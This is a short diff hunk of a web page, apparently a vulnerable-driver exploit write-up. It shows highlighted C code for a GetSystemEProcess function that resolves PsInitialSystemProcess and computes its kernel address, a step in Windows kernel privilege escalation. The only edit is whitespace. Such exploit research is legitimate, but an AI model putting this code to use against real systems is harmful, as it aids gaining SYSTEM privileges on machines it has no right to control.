@@ -1352,7 +1352,7 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
 
 </span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
     </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
-    
+
     </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
     </span><span class="na">QWORD</span><span class="p"> offsetPsInitialProcess</span><span class="o"> =</span><span class="p"> userPsInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
     </span><span class="na">QWORD</span><span class="p"> kernelPsInitialProcess</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetPsInitialProcess;
